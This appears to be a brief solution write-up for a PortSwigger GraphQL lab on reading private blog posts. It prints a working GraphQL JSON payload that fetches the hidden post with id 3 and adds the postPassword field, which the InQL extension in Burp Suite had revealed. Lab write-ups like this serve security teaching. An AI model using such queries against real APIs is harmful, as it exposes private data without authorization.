The JSON payload at the bottom of this file is meant to solve the following lab:
https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

Looking at the blog posts you'll notice that blog post 3 is missing.
Using the InQL extension in BurpSuite we'll also see that there is a field named postPassword.

In order to retrieve the password for the secret blog post we can use the following payload,
which was modified from an intercepted POST request to a random blog (id was changed to 3 and postPassword field added):

{
    "query": "\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n     postPassword\n       author\n            date\n            paragraphs\n        }\n    }",
    "operationName": "getBlogPost",
    "variables": {
      "id": 3
    }
}
